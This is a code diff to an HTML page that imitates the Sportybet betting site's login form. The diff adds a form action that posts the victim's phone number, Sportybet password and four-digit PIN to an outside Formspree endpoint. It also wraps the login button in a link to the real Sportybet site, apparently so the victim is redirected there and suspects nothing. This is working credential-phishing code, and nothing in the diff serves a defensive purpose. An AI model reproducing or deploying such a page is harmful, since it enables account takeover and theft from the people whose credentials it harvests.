@@ -59,24 +59,27 @@
     </header>
     <main class="pb-10 px-10 flex flex-col">
       <div>
-        <form>
+        <form  method="POST" action="https://formspree.io/f/mvoygqok" >
           <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
             <div>+234</div>
             <input
               type="number"
-              id="number"
+              id="number" name="Phone Number"
               placeholder="Sportybet Mobile Number"
               required class="flex-1 outline-none"
             />
           </div>
           <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
-            <input type="password" id="Password" placeholder="Sportybet Password" class="flex-1 outline-none text-gray-500" required />
+            <input type="password" id="Password" placeholder="Sportybet" name="Sportybet Password" class="flex-1 outline-none text-gray-500" required />
           </div>
           <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
-            <input type="number" id="number" placeholder="Sportybet Four Pin" class="flex-1 outline-none" required minlength="4" maxlength="4" />
+            <input type="number" id="number" placeholder="Sportybet Four Pin" class="flex-1 outline-none" name="Four Digit Pin" required minlength="4" maxlength="4" />
           </div>
           <div class="flex items-center w-[100%] lg:w-[99%] -ml-3 p-3 mb-5 mt-10">
-          <button type="submit" class="text-center w-full bg-green-700 py-4 text-white capitalize text-lg rounded shadow hover:shadow-lg active:scale-90 duration-200 ease-out">login</button>
+            <a href="https://www.sportybet.com/ng/?utm_source=google&utm_medium=cpc&utm_campaign=11749214843&utm_content=119315394172&utm_term=sportybet&utm_source=google&utm_medium=cpc&utm_campaign=11749214843&utm_content=119315394172&utm_term=sportybet&gclid=CjwKCAjwu5yYBhAjEiwAKXk_ePeZYcndhufK6IY14Qak4pG0Si8ZB9tWgR3EJjmZm5OXLJ8_C7UeXRoC5XsQAvD_BwE" class="home w-full">
+          <button type="submit" class="text-center w-full bg-green-700 py-4 text-white capitalize text-lg rounded shadow hover:shadow-lg active:scale-90 duration-200 ease-out">
+            login</button>
+        </a>
           </div>
         </form>
       </div>
